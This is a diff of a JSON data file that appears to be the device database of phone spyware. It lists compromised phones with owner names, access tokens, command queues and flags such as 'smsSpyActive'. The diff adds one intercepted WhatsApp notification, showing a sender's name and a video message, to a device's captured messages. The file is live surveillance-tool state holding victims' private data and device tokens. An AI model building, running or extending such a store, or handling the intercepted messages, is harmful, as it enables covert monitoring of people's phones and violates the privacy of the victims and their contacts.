@@ -4,7 +4,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "beb4680df9d0c4760e888ab7befb5c20",
-    "lastSeen": 1775817719799,
+    "lastSeen": 1775817746994,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T07:13:35.169Z",
@@ -116,7 +116,7 @@
     "deviceName": "HP-DDD-6DEF",
     "ownerUsername": "kamu cii",
     "token": "246f790ea49ac7f86fc663e710b7b286",
-    "lastSeen": 1775817717897,
+    "lastSeen": 1775817745744,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T10:06:23.436Z",
@@ -131,7 +131,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (4 pesan): ~ .",
+        "content": "🎥 Video (0.30)",
+        "time": "10/04 18:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775817747257
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
